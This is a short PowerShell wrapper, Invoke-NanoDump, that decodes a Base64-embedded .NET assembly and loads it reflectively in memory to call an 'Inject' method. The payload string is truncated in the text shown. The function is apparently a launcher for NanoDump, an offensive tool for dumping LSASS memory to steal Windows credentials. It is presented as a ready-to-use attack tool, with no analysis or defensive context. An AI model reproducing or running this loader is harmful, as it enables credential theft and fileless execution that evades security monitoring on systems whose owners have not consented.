function Invoke-NanoDump
{
Param
    (
        [switch]
        $valid
)
if ($valid)
{
    $choice = 1
}
else
{
    $choice = 2
}
    $base64binary="TVqQAAMAAAAEAAAA//8AALgA...AAAAAAAAAAAAAAAAA==" # NOTE: The actual 988504-character Base64 string omitted for readability.
    $RAS = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($base64binary))
    [NanoDumpInject.Program]::Inject($choice)
}
